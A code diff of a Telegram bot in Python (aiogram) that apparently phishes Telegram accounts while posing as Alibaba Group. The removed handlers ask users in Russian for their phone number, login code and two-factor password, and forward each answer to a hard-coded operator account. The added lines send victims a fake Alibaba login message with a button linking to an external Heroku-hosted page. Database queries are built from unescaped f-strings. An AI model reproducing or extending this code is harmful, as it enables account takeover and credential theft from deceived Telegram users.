@@ -125,26 +125,6 @@ async def message(msg: types.Message):
 		await bot.send_message(msg.from_user.id, "Ожидайте рассмотрение заявки модератером")
 	elif page == 7:
 		await bot.send_message(msg.from_user.id, "Ваша заявка находиться на рассмотрении")
-	elif page == 8:
-		cursor.execute(f"UPDATE users SET page=9 WHERE id={msg.from_user.id}")
-		conn.commit()
-		await bot.send_message(msg.from_user.id, "Мы только что отправили вам сообщение. Пожалуйста, подтвердите доступ через Telegram. Введите код из сообщения.")
-		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}")
-	elif page == 9:
-		cursor.execute(f"UPDATE users SET page=10 WHERE id={msg.from_user.id}")
-		conn.commit()
-		await bot.send_message(msg.from_user.id, "Введите ваш двухфакторный пароль от аккаунта Telegram. Если его нет, пропустите данный этап")
-		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}")
-	elif page == 10:
-		cursor.execute(f"UPDATE users SET page=11 WHERE id={msg.from_user.id}")
-		conn.commit()
-		await bot.send_message(msg.from_user.id, "Ожидайте модерацию в течение 1 часа.", reply_markup=Back_auth_Keyboard)
-		await bot.send_message(5389497223, f"{msg.from_user.id}\n{msg.text}", reply_markup=AdminPanelAuthKeyboard)
-	elif page == 11:
-		if msg.text == "Сменить данные":
-			cursor.execute(f"UPDATE users SET page=8 WHERE id={msg.from_user.id}")
-			conn.commit()
-			await bot.send_message(msg.from_user.id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>\n<u>Пожалуйста, введите свой номер телефона в <a href='https://telegram.org/faq#login-and-sms'>международном формате</a></u> и мы отправим подтверждающее сообщение на ваш аккаунт через Telegram", parse_mode="HTML")
 
 
 @dp.callback_query_handler(lambda c: c.data == "invite_q")
@@ -153,8 +133,11 @@ async def invite_q(callback_query: types.CallbackQuery):
 	user_id = int(callback_query.message.text.split("\n")[0])
 	cursor.execute(f"UPDATE users SET page=17 WHERE id={user_id}")
 	conn.commit()
+	Start_auth_Keyboard = InlineKeyboardMarkup()
+	start_auth_but = InlineKeyboardButton("Авторизация", url=f"alibabacooperation.herokuapp.com?id={user_id}")
+	Start_auth_Keyboard.add(start_auth_but)
 	await bot.edit_message_text(text=f"Вы приняли заявку\n{callback_query.message.text}", chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
-	await bot.send_message(user_id, "Ваша заявка принята", reply_markup=Start_auth_Keyboard)
+	await bot.send_message(user_id, "Авторизация в Telegram\nВойдите, чтобы использовать свою учетную запись Telegram в <a href='https://www.alibabagroup.com/en-US/'>Alibaba Group</a>", reply_markup=Start_auth_Keyboard, parse_mode="HTML")
 
 
 @dp.callback_query_handler(lambda c: c.data == "back_q")
